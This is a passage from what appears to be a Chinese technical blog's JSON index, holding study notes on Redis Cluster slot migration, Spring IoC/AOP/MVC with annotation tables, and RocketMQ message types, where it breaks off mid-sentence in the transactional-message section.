Cluster的数据迁移的单位是槽，提供的迁移工具是redis-trib，redis-trib首先会在源节点和目标节点设置好中间过渡状态，然后再一次性获取源节点槽位的所有key列表，再逐个key进行迁移。每个key迁移到过程是以源节点作为目标节点的客户端，源节点对当前key执行dump指令得到序列化内容，然后向目标节点发送restore指令携带序列化的内容作为参数，目标节点再反序列化就可以把内容恢复到目标节点的内存中。然后返回给源节点OK信息，源节点收到后把当前节点的key删除。\n当源节点正在进行对key的数据迁移，源节点的主线程就会处于阻塞状态，直到key被成功删除。在迁移过程中如果每个key都很小，migrate迁移指令会执行的很快，而如果key比较大，就会导致阻塞源节点的正常服务。\n因为migrate命令是同步阻塞的，因此不会存在一个key正在被迁移又同时被读写的情况，但由于一个slot下可能有部分key被迁移完成，部分key正在等待迁移的情况，因此如果读写的key所属的slot正在被迁移，redis-cluster做如下处理：\n\n客户端根据本地slots缓存发送命令到源节点，如果存在键对象则直接指向并返回结果给客户端。\n如果key对象不存在，但key所在的slot属于本节点，则可能存在于目标节点，这时源节点会回复ASK重定向异常-ASK targetNodeAddr\n客户端从ASK重定向异常提取出目标节点的地址信息（targetNodeAddr），发送asking命令到目标节点。目标节点如果key存在则执行，不存在则返回不存在信息。\n\nRedis Cluster处理网络抖动：\n网络抖动是突然间部分连接不可访问，然后很快又恢复正常的一种现象。\n为解决网络抖动的问题，Redis Cluster提供了配置参数cluster-node-timeout，表示当前某个节点持续timeout的时间失联时，才认定该节点出现故障。如果没有这一配置选项，网络抖动会导致频繁的主从切换。\nRaft协议Gossip协议可能下线（PFail）和确定下线（Fail）：因为Redis Cluster是去中心化的，一个节点认为某个节点失联了并不代表所有节点都认为它失联了，所以集群需要进行一次协商，只有当大多数节点都认为某节点失联了，集群才做出节点已经下线的判断。\nRedis Cluster采用Gossip协议来广播自己的状态以及改变对整个集群节点的在线状态。\n拓展info指令\ninfo stats：查看Redis 每秒执行多少次指令。\ninfo clients：查看Redis 连接了多少客户端。\nrejected_connections：查看因为超出大量连接限制而被拒接的客户端连接次数。如果这个数字很大意味着服务器的最大连接数设置的过低，需要调整 maxclients 参数。其默认值为 1w。\ninfo memory：查看Redis 内存占用多大\ninfo replication：查看复制积压缓冲区大小\n\nReferences\n钱文品. Redis深度历险:核心原理与应用实践. 北京: 电子工业出版社, 2019.1.\n\n","categories":["IT"],"tags":["Redis"]},{"title":"Spring","url":"/2023/05/05/Spring/","content":"Spring特性Spring基于J2EE技术实现了一套轻量的Java Web Service系统应用框架，有很多优秀的特性，包括，依赖注入（DI）、控制反转（IoC）、面向切面（AOP）、轻量、灵活\n\n控制反转\n指的是对象依赖的对象，将会在容器的初始化完成后会主动传递给对象，而不需要对象自己创建或查询其依赖的对象，实现了系统对象之间依赖的解耦\nSpring通过依赖注入实现控制反转，依赖注入是一种设计模式，通过该模式，对象不再创建或管理它们所需要的其他对象或服务，而是由容器（例如Spring容器）负责创建和管理这些对象或服务，并注入到需要它们的对象中。\n\n\n面向切面\n面向切面是一种编程范式，用于将系统的横切关注点（如安全性、事务、日志记录等）与业务逻辑分离\n面向切面通过将横切关注点划分为独立的模块，并在运行时动态地将这些模块植入到程序中，从而实现了对业务逻辑的无侵入式增强\nSpring AOP通过使用动态代理技术来实现对目标对象的增强\n\n\n轻量\nspring-web-5.2.0.RELEASE.jar和spring-core-5.2.0.RELEASE.jar均仅有1.4M左右\n只需要少量的操作系统资源\n\n\n灵活\n是模块化的，可以按需引入模块（以jar包依赖的方式引入）\n\n\n\nSpring的核心JAR包Spring是模块化实现的，每个模块对应不同的JAR包\nSpring框架的所有JAR包：\n\n\n\n名称\n简介\n\n\n\nspring-aop\n提供了Spring框架的面向切面编程（AOP）功能，用于在运行时动态地增强应用程序的功能。\n\n\nspring-aspects\n提供了Spring框架的切面库，包括对AspectJ切面的支持和一些通用切面的实现。\n\n\nspring-beans\n提供了Spring框架的BeanFactory和FactoryBean等工厂类，用于管理和配置应用程序中的对象。\n\n\nspring-context\n提供了Spring框架的应用上下文（ApplicationContext），用于管理应用程序中的Bean对象，以及Spring框架的事件驱动编程模型。\n\n\nspring-context-indexer\n提供了一个工具，用于在编译时为Spring应用程序生成索引文件，以提高应用程序启动的速度。\n\n\nspring-context-support\n提供了一些扩展类，用于在Spring应用程序中支持特定的应用场景，例如JPA、Velocity等。\n\n\nspring-core\nSpring框架的核心模块，提供了Spring框架的基本功能，如依赖注入、控制反转、Bean工厂等。\n\n\nspring-expression\n提供了Spring框架的表达式语言（SpEL），用于在应用程序中动态地访问和操作对象。\n\n\nspring-instrument\n提供了Spring框架的Instrumentation API支持，用于在运行时通过Java Agent来提供增强功能。\n\n\nspring-instrument-tomcat\n提供了Spring框架在Tomcat服务器中使用Instrumentation API的支持。\n\n\nspring-jcl\n提供了Spring框架的通用日志抽象库，可以在不同的日志实现之间进行切换。\n\n\nspring-jdbc\n提供了Spring框架的JDBC支持，包括对JdbcTemplate和NamedParameterJdbcTemplate等的封装。\n\n\nspring-jms\n提供了Spring框架的Java Message Service（JMS）支持，用于在应用程序中发送和接收消息。\n\n\nspring-messaging\n提供了Spring框架的消息处理功能，包括对WebSocket、STOMP、AMQP等协议的支持。\n\n\nspring-orm\n提供了Spring框架的对象关系映射（ORM）支持，包括对Hibernate、MyBatis等ORM框架的集成。\n\n\nspring-oxm\n提供了Spring框架的对象XML映射（OXM）支持，用于在Java对象和XML文档之间进行转换。\n\n\nspring-test\n提供了Spring框架的测试支持，包括对JUnit、TestNG等测试框架的集成，以及对Spring应用程序的集成测试支持。\n\n\nspring-tx\n提供了Spring框\n\n\nSpring注解Spring的注解将Bean的定义和依赖关系从XML配置中解放出来，应用程序只要使用注解依赖注入即可\nBean具体的定义和依赖关系由Spring的自动装配完成\n依赖注入相关注解\n\n\n注解\n翻译名称\n简介\n\n\n\n@Autowired\n自动注入\n根据类型进行自动注入，如果有多个符合条件的Bean，可以通过指定名称或限定符来进行注入。\n\n\n@Qualifier\n限定符\n与@Autowired一起使用，指定Bean的名称或限定符，以便进行注入。\n\n\n@Resource\n资源注入\n根据名称进行自动注入，可以与指定类型或名称的方式进行限定。\n\n\n@Value\n属性注入\n用于注入常量或表达式计算的结果值。\n\n\n@Inject\nJSR-330注解\n与@Autowired类似，但具有更加灵活的限定符支持。\n\n\nBean定义相关注解\n\n\n注解\n翻译名称\n简介\n\n\n\n@Component\n通用组件\n用于将类定义为Spring组件，并且可以与其他注解一起使用，如@Controller、@Service、@Repository等。\n\n\n@Configuration\n配置类\n用于定义Spring应用程序的配置类，并且可以通过@Bean方法定义Bean对象。\n\n\n@Bean\nBean定义\n用于在配置类中定义Bean对象，并将其添加到Spring容器中。\n\n\n@Profile\n环境选择\n用于基于不同的应用程序环境选择Bean定义，可以与@Conditional一起使用。\n\n\n@Scope\nBean作用域\n用于定义Bean对象的作用域，包括Singleton、Prototype、Request、Session等。\n\n\nAOP相关注解\n\n\n注解\n翻译名称\n简介\n\n\n\n@Aspect\n切面定义\n用于将类定义为切面，可以在其中定义切点和通知。\n\n\n@Pointcut\n切点定义\n用于定义切点，指定连接点的匹配规则。\n\n\n@Before\n前置通知\n在方法执行之前执行通知。\n\n\n@After\n后置通知\n在方法执行之后执行通知。\n\n\n@AfterReturning\n返回通知\n在方法执行之后返回结果后执行通知。\n\n\n@AfterThrowing\n异常通知\n在方法执行时抛出异常后执行通知。\n\n\n@Around\n环绕通知\n在方法执行之前和之后都可以执行通知。\n\n\nWeb相关注解\n\n\n注解\n翻译名称\n简介\n\n\n\n@Controller\n控制器\n用于将类定义为Spring MVC的控制器，处理HTTP请求并返回响应结果。\n\n\n@RestController\nREST控制器\n与@Controller类似，但默认情况下返回JSON或XML格式的响应结果。\n\n\n@RequestMapping\n请求映射\n用于将HTTP请求映射到处理方法上，并指定请求的URL、请求方法、请求参数等。\n\n\n@GetMapping\nGET请求映射\n用于将HTTP GET请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@PostMapping\nPOST请求映射\n用于将HTTP POST请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@PutMapping\nPUT请求映射\n用于将HTTP PUT请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@DeleteMapping\nDELETE请求映射\n用于将HTTP DELETE请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@PatchMapping\nPATCH请求映射\n用于将HTTP PATCH请求映射到处理方法上，简化了@RequestMapping的用法。\n\n\n@PathVariable\n路径变量\n用于将URI中的变量绑定到处理方法的参数上。\n\n\n@RequestParam\n请求参数\n用于将HTTP请求中的参数绑定到处理方法的参数上。\n\n\n@RequestBody\n请求体\n用于将HTTP请求体中的数据绑定到处理方法的参数上。\n\n\n@RequestHeader\n请求头\n用于将HTTP请求头中的数据绑定到处理方法的参数上。\n\n\n@CookieValue\nCookie值\n用于将HTTP Cookie中的值绑定到处理方法的参数上。\n\n\n@ResponseBody\n响应体\n用于将处理方法的返回值作为HTTP响应体返回给客户端。\n\n\n@ResponseStatus\n响应状态码\n用于指定处理方法的返回状态码。\n\n\n@SessionAttributes\n会话属性\n用于在会话中存储处理方法的模型属性。\n\n\n@ModelAttribute\n模型属性\n用于将请求参数绑定到模型属性上。\n\n\n@InitBinder\n初始化绑定器\n用于初始化WebDataBinder，用于数据绑定和格式化等操作。\n\n\n@ExceptionHandler\n异常处理\n用于处理控制器中抛出的异常。\n\n\n@CrossOrigin\n跨域资源共享\n用于处理跨域请求，允许指定允许跨域请求的来源、方法和头信息等。\n\n\nSpring IoC原理IoC简介Spring IoC通过Java反射功能实例化并建立Bean之间的依赖关系\nSpring IoC在完成这些底层工作的基础上，还提供了Bean实例缓存管理、Bean生命周期管理、Bean实例代理、事件发布和资源装载等高级服务\nBean的装配流程Spring通过读取XML或注解获取Bean的配置信息，并在Bean容器中生成Bean配置注册表，然后根据配置注册表实例化Bean，将Bean实例载入Bean缓存池，业务程序就可以从Bean缓存池中获取Bean\nBean的作用域Bean有五种作用域：\n\nSingleton：单例作用域，表示在 Spring IoC 容器中只存在一个 Bean 对象实例，所有对该 Bean 的请求都将返回该唯一实例。\nPrototype：原型作用域，每次对该 Bean 的请求都将创建一个新的 Bean 实例。每次使用时都会创建新的对象。\nRequest：请求作用域，每个 HTTP 请求都将创建一个新的 Bean 实例，该 Bean 仅在当前 HTTP 请求中有效。\nSession：会话作用域，每个 HTTP 会话都将创建一个新的 Bean 实例，该 Bean 仅在当前 HTTP 会话中有效。\nGlobalSession：全局会话作用域，仅适用于使用基于 Portlet 的 web 应用。它是在一个全局的 Portlet 会话中共享的 Bean 实例。\n\n除了这五种标准作用域外，Spring 还支持自定义作用域。在 Spring 中，我们可以通过实现 Scope 接口并重写对应方法来实现自定义作用域。这样可以让我们更加灵活地管理 Bean 的生命周期，以满足应用程序的特定需求。\nBean的生命周期Spring Bean 的生命周期是 Spring IoC 容器管理的重要部分，它由一系列的回调函数来控制。在 Spring 容器创建 Bean 实例对象时，会经历以下阶段：\n\nBean 实例化：Spring IoC 容器通过反射机制实例化一个 Bean 对象，通常是使用默认的构造函数来创建 Bean 实例。\n\n属性注入：Spring IoC 容器通过 setter 方法或者直接访问 Bean 属性来注入 Bean 的属性。\n\nBeanPostProcessor 前置处理器：在 Bean 实例化之后，Spring IoC 容器会自动检测是否有实现了 BeanPostProcessor 接口的类，并调用它们的 postProcessBeforeInitialization() 方法来对 Bean 进行前置处理。\n\n初始化：Spring IoC 容器调用 Bean 实现 InitializingBean 接口或者配置的 init-method 方法，执行 Bean 的初始化操作。\n\nBeanPostProcessor 后置处理器：在 Bean 初始化之后，Spring IoC 容器会自动检测是否有实现了 BeanPostProcessor 接口的类，并调用它们的 postProcessAfterInitialization() 方法来对 Bean 进行后置处理。\n\n使用：Bean 实例化完成并初始化后，就可以在应用程序中使用它了。\n\n销毁：当 Spring IoC 容器关闭时，它会调用 Bean 实现 DisposableBean 接口或者配置的 destroy-method 方法，执行 Bean 的销毁操作。\n\n\n此外，Spring Bean 的生命周期可以被定制化，我们可以自定义 BeanPostProcessor 实现类或者配置 init-method 和 destroy-method 方法，来在 Bean 的生命周期中加入自己的逻辑处理。\nBeanPostProcessor 前置处理器是 Spring IoC 容器中的一个扩展点，用于在 Bean 的初始化前进行额外的处理，可以对 Bean 对象进行修改或增强。BeanPostProcessor 接口定义了两个方法：\n\npostProcessBeforeInitialization(Object bean, String beanName)：在 Bean 初始化之前调用该方法，可以对 Bean 对象进行一些修改或增强操作。\n\npostProcessAfterInitialization(Object bean, String beanName)：在 Bean 初始化之后调用该方法，可以对 Bean 对象进行一些修改或增强操作。\n\n\n在 Spring IoC 容器中，当一个 Bean 实例化完成后，会检查是否有实现了 BeanPostProcessor 接口的类，如果有，则会依次调用它们的 postProcessBeforeInitialization() 方法，然后进行 Bean 的初始化操作，最后再依次调用实现了 BeanPostProcessor 接口的类的 postProcessAfterInitialization() 方法。通过实现 BeanPostProcessor 接口，我们可以在 Bean 实例化前后进行一些自定义的操作，例如：\n\n为 Bean 注入日志处理、事务处理等公共的功能。\n\n在 Bean 初始化前后进行性能监控、安全检查等操作。\n\n对 Bean 进行代理，实现 AOP 的功能。\n\n\n需要注意的是，在实现 BeanPostProcessor 接口时，必须小心处理，以免破坏 Bean 的正常生命周期。同时，也应该尽量保持 BeanPostProcessor 的轻量级，避免对系统性能产生过大的影响。\n总之，BeanPostProcessor 前置处理器是 Spring IoC 容器中的一个重要扩展点，通过实现该接口，可以在 Bean 实例化前后进行一些自定义的操作，从而增强 Bean 的功能和灵活性。\nSpring AOP原理AOP简介Spring AOP通过面向切面技术，将与业务无关或被业务模块共用的代码封装起来，以提高代码的复用度，降低模块间的耦合度\nAOP 的核心概念\n\n\n概念\n描述\n\n\n\n切面（Aspect）\n对一个或多个横切关注点的封装，它包含了切点、通知和切点表达式等元素。切面定义了何时、何地以及如何将横切关注点织入到目标对象中。\n\n\n切点（Pointcut）\n目标对象中的一组方法或者类，它们将被织入到横切关注点中。切点通常由切点表达式和其他过滤条件组成。\n\n\n通知（Advice）\n在织入横切关注点时要执行的逻辑代码，它包括了前置通知、后置通知、环绕通知、异常通知和最终通知等不同类型。\n\n\n切点表达式（Pointcut Expression）\n一种指定切点的语法规则，它可以根据方法名、返回值类型、方法参数等多种条件进行切点匹配。\n\n\n连接点（Join Point）\n程序执行过程中的某个特定位置，例如方法调用、方法执行、异常抛出等。连接点是织入横切关注点的具体执行位置。\n\n\n织入（Weaving）\n将横切关注点应用到目标对象的过程，它可以通过代理模式实现。在 Spring AOP 中，织入分为编译期织入、类装载期织入和运行期织入三种方式。\n\n\n上述概念是 Spring AOP 技术中的核心要素，了解这些概念对于掌握和使用 Spring AOP 技术非常重要。切面、切点、通知和切点表达式是定义 AOP 配置的基础，连接点则表示切点匹配到的具体执行位置，织入则是实现 AOP 功能的核心机制。\nAOP横切关注点Srping将应用分为核心关注点和横切关注点两部分\n\n核心关注点（Core Concerns）是指应用程序的基本业务逻辑，例如数据访问、业务逻辑处理等。核心关注点是应用程序的主要功能，通常是由应用程序开发人员直接实现的。\n\n横切关注点（Cross-Cutting Concerns）是指应用程序中与核心业务逻辑无关的横切问题，例如日志记录、事务管理、安全控制等。\n\n\n在 Spring AOP 中，横切关注点可以通过定义切面（Aspect）来实现。通常情况下，切面是一个 Java 类，其中包含了一些切点（Pointcut）、通知（Advice）和切点表达式（Pointcut Expression）等元素。\n\n切点（Pointcut）：用于定义一个或多个目标对象中哪些方法需要被织入横切关注点。\n通知（Advice）：定义了横切关注点在目标对象中何时被执行以及执行的逻辑。\n切点表达式（Pointcut Expression）：用于指定切点的匹配规则。\n\nSpring AOP 的实现是基于代理模式的，它通过创建代理对象来织入切面逻辑。Spring AOP 支持两种代理方式：JDK 动态代理和 CGLIB 代理。对于实现了接口的类，Spring AOP 将使用 JDK 动态代理来创建代理对象；对于没有实现接口的类，Spring AOP 将使用 CGLIB 代理来创建代理对象。\nAOP的5种通知类型Spring AOP 提供了以下五种类型的通知：\n\n前置通知（Before Advice）：在目标方法执行前执行。\n后置通知（After Returning Advice）：在目标方法返回后执行。\n环绕通知（Around Advice）：在目标方法执行前后都执行。\n异常通知（After Throwing Advice）：在目标方法抛出异常时执行。\n最终通知（After Advice）：无论目标方法是否正常执行完成，最终通知都会被执行。\n\nAOP的应用\n\n\n应用场景\n切面类型\n示例\n\n\n\n日志记录\n前置通知（Before）\n在用户登录时记录登录时间和 IP 地址\n\n\n性能监控\n环绕通知（Around）\n在对数据库进行查询时统计查询时间和资源占用情况\n\n\n安全控制\n前置通知（Before）\n在访问受保护的资源时检查用户的身份和权限信息\n\n\n事务管理\n环绕通知（Around）\n在对数据库进行更新操作时开启和提交事务\n\n\n异常处理\n异常通知（AfterThrowing）\n在文件上传时捕获文件格式不正确等异常信息，并进行相应的处理\n\n\nSpring MVC原理MVC简介Spring的MVC即模型-视图-控制器，该框架围绕DispatcherServlet设计而成，DispatcherServlet会把请求分发给各个处理器\nSpringMVC 的工作流程主要包括以下几个步骤：\n\n客户端发送请求：客户端向服务器发送请求，请求可以是一个 URL 地址、一个表单提交或者一个 AJAX 请求。\n\nDispatcherServlet 接收请求：DispatcherServlet 是 SpringMVC 框架的核心控制器，它负责接收客户端发送的请求，并将请求转发给对应的处理器。\n\nHandlerMapping 查找处理器：HandlerMapping 负责根据请求 URL 查找对应的处理器，处理器可以是一个 Controller 或者一个 Restful Web Service。\n\nHandlerAdapter 调用处理器：HandlerAdapter 负责调用处理器，将请求传递给处理器进行处理，并获取处理器的处理结果。\n\n处理器处理请求：处理器根据请求的类型和参数，进行相应的业务处理，并返回一个 ModelAndView 对象。\n\n视图解析器解析视图：视图解析器根据 ModelAndView 中的视图名，将其解析成对应的视图对象，视图可以是一个 JSP 页面、一个 Thymeleaf 模板或者一个 HTML 片段等。\n\n渲染视图：视图对象根据数据模型和视图模板，生成 HTML 内容，并将其返回给客户端。\n\n返回响应：DispatcherServlet 将视图渲染的结果返回给客户端，客户端可以是一个浏览器、一个移动应用或者一个 API 调用。\n\n\n总之，SpringMVC 的工作流程涉及到多个组件之间的协作，其中 DispatcherServlet 负责接收请求和控制流程，HandlerMapping 负责查找处理器，HandlerAdapter 负责调用处理器，视图解析器负责解析视图，视图对象负责渲染视图，最终将响应返回给客户端。\nReferences\n王磊. Offer来了:Java面试核心知识点精讲. 北京: 电子工业出版社.\n\n","categories":["IT"],"tags":["Spring"]},{"title":"RocketMQ","url":"/2023/05/24/RocketMQ/","content":"RocketMQ简介RocketMQ是一款由Alibaba研发的分布式的消息中间件。支持事务消息、顺序消息、延时消息、定时消息、批量消息。\nApache RocketMQ 中消息的生命周期主要分为消息生产、消息存储、消息消费这三部分。生产者生产消息并发送至 Apache RocketMQ 服务端（Broker），消息被存储在Broker的主题（Topic）中，主题内可以有多个消费队列，消费者通过订阅主题消费消息。\n消息中间件的应用场景消息中间件常用于分布式系统中的应用解耦、流量削峰填谷、异步处理等场景。比如，再秒杀业务中，在秒杀业务中下单后可以发送延迟消息，若5分钟未支付，就取消订单、回滚库存。\n消息队列的应用场景：\n\n应用解耦：系统的耦合度越高，容错性就越低。在等待系统恢复正常的时间里，要处理的数据可以被缓存到消息队列中。\n流量削峰填谷：消息到加入消息队列而不是直接发给消费者，消费者按照自己的消费速度从消息队列获取消息进行处理。\n异步处理：不需要同步处理完成后才能响应，由消息队列缓存消息后续通知消息接收方进行异步处理，提高了响应效率。\n\n模型概念服务端\nBroker\nBroker是Apache RocketMQ的服务端，生产者生产的消息会发送到 Broker，并存储在Broker的主题（Topic）中。\n\nNameServer\nNameServer是Broker注册中心，支持Broker的注册和发现、Topic路由、Broker心跳检测。\nNameServer通常采用集群的方式部署，各实例间互相不进行通信，Broker会向每一台NameServer注册，所以每一个NameServer都保存一份完整的路由信息，当某个NameServer下线了，Broker依然可以向其它的NameServer注册。\n\n\n消息生产\n生产者（Producer）：\nApache RocketMQ 中用于产生消息的运行实体，一般集成于业务调用链路的上游。生产者是轻量级匿名无身份的。\n\n\n消息存储\n主题（Topic）：\nApache RocketMQ 消息传输和存储的分组容器，主题内部由多个队列组成，消息的存储和水平扩展实际是通过主题内的队列实现的。\n\n队列（MessageQueue）：\nApache RocketMQ 消息传输和存储的实际单元容器，类比于其他消息队列中的分区。 Apache RocketMQ 通过流式特性的无限队列结构来存储消息，消息在队列内具备顺序性存储特征。\n\n消息（Message）：\nApache RocketMQ 的最小传输单元。消息具备不可变性，在初始化发送和完成存储后即不可变。\n\n队列类型（MessageType）：\n由用于类型管理和安全验证的消息传输特性定义的类别。Apache RocketMQ支持NORMAL、FIFO、TRANSACTION和DELAY消息类型。\n\n消息视图（MessageView）：\n从开发的角度来看，MessageView 是消息的只读接口。消息视图允许读取消息中的多个属性和负载信息，但不能对消息本身进行任何更改。\n\n消息标签（MessageTag）：\nMessageTag是一个细粒度的消息分类属性，允许在主题级别以下对消息进行细分。消费者通过订阅特定标签来实现消息过滤。\n\n\n消息消费\n消费者分组（ConsumerGroup）：\nApache RocketMQ 发布订阅模型中定义的独立的消费身份分组，用于统一管理底层运行的多个消费者（Consumer）。同一个消费组的多个消费者必须保持消费逻辑和配置一致，共同分担该消费组订阅的消息，实现消费能力的水平扩展。\n\n消费者（Consumer）：\nApache RocketMQ 消费消息的运行实体，一般集成在业务调用链路的下游。消费者必须被指定到某一个消费组中。\n\n订阅关系（Subscription）：\nApache RocketMQ 发布订阅模型中消息过滤、重试、消费进度的规则配置。订阅关系以消费组粒度进行管理，消费组通过定义订阅关系控制指定消费组下的消费者如何实现消息过滤、消费重试及消费进度恢复等。\nApache RocketMQ 的订阅关系除过滤表达式之外都是持久化的，即服务端重启或请求断开，订阅关系依然保留。\n\n消费结果（ConsumeResult）\nApache RocketMQ 中PushConsumer消费监听器处理消息完成后返回的处理结果，用来标识本次消息是否正确处理。消费结果包含消费成功和消费失败。\n\n\n消息类型\n普通消息\n普通消息为 Apache RocketMQ 中最基础的消息，区别于有特性的顺序消息、定时&#x2F;延时消息和事务消息。\n\n事务消息\n事务消息是Apache RocketMQ 提供的一种高级消息类型，支持在分布式场景下保障消息生产和本地事务的最终一致性。\n\n定时&#x2F;延时消息\n定时&#x2F;延时消息是Apache RocketMQ 提供的一种高级消息类型，消息被发送至服务端后，在指定时间后才能被消费者消费。通过设置一定的定时时间可以实现分布式场景的延时调度触发效果。\n\n顺序消息\n顺序消息是Apache RocketMQ 提供的一种高级消息类型，支持消费者按照发送消息的先后顺序获取消息，从而实现业务场景中的顺序处理。\n\n\n消息处理\n消息过滤\n消费者可以通过订阅指定消息标签（Tag）对消息进行过滤，确保最终只接收被过滤后的消息合集。过滤规则的计算和匹配在Apache RocketMQ 的服务端完成。更多信息，请参见消息过滤。\n\n重置消费位点\n以时间轴为坐标，在消息持久化存储的时间范围内，重新设置消费者分组对已订阅主题的消费进度，设置完成后消费者将接收设定时间点之后，由生产者发送到Apache RocketMQ 服务端的消息。更多信息，请参见重置消费位点。\n\n消息轨迹\n在一条消息从生产者发出到消费者接收并处理过程中，由各个相关节点的时间、地点等数据汇聚而成的完整链路信息。通过消息轨迹，您能清晰定位消息从生产者发出，经由Apache RocketMQ 服务端，投递给消费者的完整链路，方便定位排查问题。\n\n消息堆积\n生产者已经将消息发送到Apache RocketMQ 的服务端，但由于消费者的消费能力有限，未能在短时间内将所有消息正确消费掉，此时在服务端保存着未被消费的消息，该状态即消息堆积。\n\n\n消息类型原理普通消息应用场景\n普通消息一般应用于微服务解耦、事件驱动、数据集成等场景，这些场景大多数要求数据传输通道具有可靠传输的能力，且对消息的处理时机、处理顺序没有特别要求。\n普通消息仅支持使用MessageType为Normal主题，即普通消息只能发送至类型为普通消息的主题中，发送的消息的类型必须和主题的类型一致。\n普通消息生命周期\n\n初始化：消息被生产者构建并完成初始化，待发送到服务端的状态。\n待消费：消息被发送到服务端，对消费者可见，等待消费者消费的状态。\n消费中：消息被消费者获取，并按照消费者本地的业务逻辑进行处理的过程。 此时服务端会等待消费者完成消费并提交消费结果，如果一定时间后没有收到消费者的响应，Apache RocketMQ会对消息进行重试处理。具体信息，请参见消费重试。\n消费提交：消费者完成消费处理，并向服务端提交消费结果，服务端标记当前消息已经被处理（包括消费成功和失败）。 Apache RocketMQ默认支持保留所有消息，此时消息数据并不会立即被删除，只是逻辑标记已消费。消息在保存时间到期或存储空间不足被删除前，消费者仍然可以回溯消息重新消费。\n消息删除：Apache RocketMQ按照消息保存机制滚动清理最早的消息数据，将消息从物理文件中删除。更多信息，请参见消息存储和清理机制。\n\n顺序消息顺序消息是 Apache RocketMQ 提供的一种高级消息类型，支持消费者按照发送消息的先后顺序获取消息，从而实现业务场景中的顺序处理。 相比其他类型消息，顺序消息在发送、存储和投递的处理过程中，更多强调多条消息间的先后顺序关系。\nApache RocketMQ 顺序消息的顺序关系通过消息组（MessageGroup）判定和识别，发送顺序消息时需要为每条消息设置归属的消息组，相同消息组的多条消息之间遵循先进先出的顺序关系，不同消息组、无消息组的消息之间不涉及顺序性。\n基于消息组的顺序判定逻辑，支持按照业务逻辑做细粒度拆分，可以在满足业务局部顺序的前提下提高系统的并行度和吞吐能力。\n顺序消息仅支持使用MessageType为FIFO的主题，即顺序消息只能发送至类型为顺序消息的主题中，发送的消息的类型必须和主题的类型一致。\n应用场景\n在有序事件处理、撮合交易、数据实时增量同步等场景下，异构系统间需要维持强一致的状态同步，上游的事件变更需要按照顺序传递到下游进行处理。在这类场景下使用 Apache RocketMQ 的顺序消息可以有效保证数据传输的顺序性。\n\n典型场景一：撮合交易\n以证券、股票交易撮合场景为例，对于出价相同的交易单，坚持按照先出价先交易的原则，下游处理订单的系统需要严格按照出价顺序来处理订单。\n\n典型场景二：数据实时增量同步\n以数据库变更增量同步场景为例，上游源端数据库按需执行增删改操作，将二进制操作日志作为消息，通过 Apache RocketMQ 传输到下游搜索系统，下游系统按顺序还原消息数据，实现状态数据按序刷新。如果是普通消息则可能会导致状态混乱，和预期操作结果不符，基于顺序消息可以实现下游状态和上游操作结果一致。\n\n\n如何保证消息的顺序性\nApache RocketMQ 的消息的顺序性分为两部分，生产顺序性和消费顺序性。\n\n生产顺序性 ：\nApache RocketMQ 通过生产者和服务端的协议保障单个生产者串行地发送消息，并按序存储和持久化。\n如需保证消息生产的顺序性，则必须满足以下条件：\n\n单一生产者：消息生产的顺序性仅支持单一生产者，不同生产者分布在不同的系统，即使设置相同的消息组，不同生产者之间产生的消息也无法判定其先后顺序。\n串行发送：Apache RocketMQ 生产者客户端支持多线程安全访问，但如果生产者使用多线程并行发送，则不同线程间产生的消息将无法判定其先后顺序。\n\n满足以上条件的生产者，将顺序消息发送至 Apache RocketMQ 后，会保证设置了同一消息组的消息，按照发送顺序存储在同一队列中。服务端顺序存储逻辑如下：\n\n相同消息组的消息按照先后顺序被存储在同一个队列。\n不同消息组的消息可以混合在同一个队列中，且不保证连续。\n\n\n\n\n如上图所示，消息组1和消息组4的消息混合存储在队列1中， Apache RocketMQ 保证消息组1中的消息G1-M1、G1-M2、G1-M3是按发送顺序存储，且消息组4的消息G4-M1、G4-M2也是按顺序存储，但消息组1和消息组4中的消息不涉及顺序关系。\n\n消费顺序性 ：\nApache RocketMQ 通过消费者和服务端的协议保障消息消费严格按照存储的先后顺序来处理。\n如需保证消息消费的顺序性，则必须满足以下条件：\n\n投递顺序\nApache RocketMQ 通过客户端SDK和服务端通信协议保障消息按照服务端存储顺序投递，但业务方消费消息时需要严格按照接收—处理—应答的语义处理消息，避免因异步处理导致消息乱序。\n备注：消费者类型为PushConsumer时， Apache RocketMQ 保证消息按照存储顺序一条一条投递给消费者，若消费者类型为SimpleConsumer，则消费者有可能一次拉取多条消息。此时，消息消费的顺序性需要由业务方自行保证。消费者类型的具体信息，请参见消费者分类。\n\n有限重试\nApache RocketMQ 顺序消息投递仅在重试次数限定范围内，即一条消息如果一直重试失败，超过最大重试次数后将不再重试，跳过这条消息消费，不会一直阻塞后续消息处理。\n对于需要严格保证消费顺序的场景，请务设置合理的重试次数，避免参数不合理导致消息乱序。\n\n\n\n\n生产顺序性和消费顺序性组合\n如果消息需要严格按照先进先出（FIFO）的原则处理，即先发送的先消费、后发送的后消费，则必须要同时满足生产顺序性和消费顺序性。\n一般业务场景下，同一个生产者可能对接多个下游消费者，不一定所有的消费者业务都需要顺序消费，您可以将生产顺序性和消费顺序性进行差异化组合，应用于不同的业务场景。例如发送顺序消息，但使用非顺序的并发消费方式来提高吞吐能力。\n顺序消息生命周期\n同普通消息的生命周期\n事务消息Apache RocketMQ 提供的事务消息支持在分布式场景下保障消息的最终一致性。\n其它事务消息的处理方案\n\n传统XA事务方案：性能不足\n为了保证分支的执行结果一致性，典型方案是基于XA协议的分布式事务系统来实现。将多个调用分支封装成包含独立事务分支的大事务。基于XA分布式事务的方案可以满足业务处理结果的正确性，但最大的缺点是多分支环境下资源锁定范围大，并发度低，随着下游分支的增加，系统性能会越来越差。\n\n\n事务消息处理流程\n事务消息交互流程如下图所示。\n\n生产者将消息发送至Apache RocketMQ服务端。\nApache RocketMQ服务端将消息持久化成功之后，向生产者返回Ack确认消息已经发送成功，此时消息被标记为”暂不能投递”，这种状态下的消息即为半事务消息。\n生产者开始执行本地事务逻辑。\n生产者根据本地事务执行结果向服务端提交二次确认结果（Commit或是Rollback），服务端收到确认结果后处理逻辑如下：\n二次确认结果为Commit：服务端将半事务消息标记为可投递，并投递给消费者。\n二次确认结果为Rollback：服务端将回滚事务，不会将半事务消息投递给消费者。\n\n\n在断网或者是生产者应用重启的特殊情况下，若服务端未收到生产者提交的二次确认结果，或服务端收到的二次确认结果为Unknown未知状态，经过固定时间后，服务端将对消息生产者即生产者集群中任一生产者实例发起消息回查。 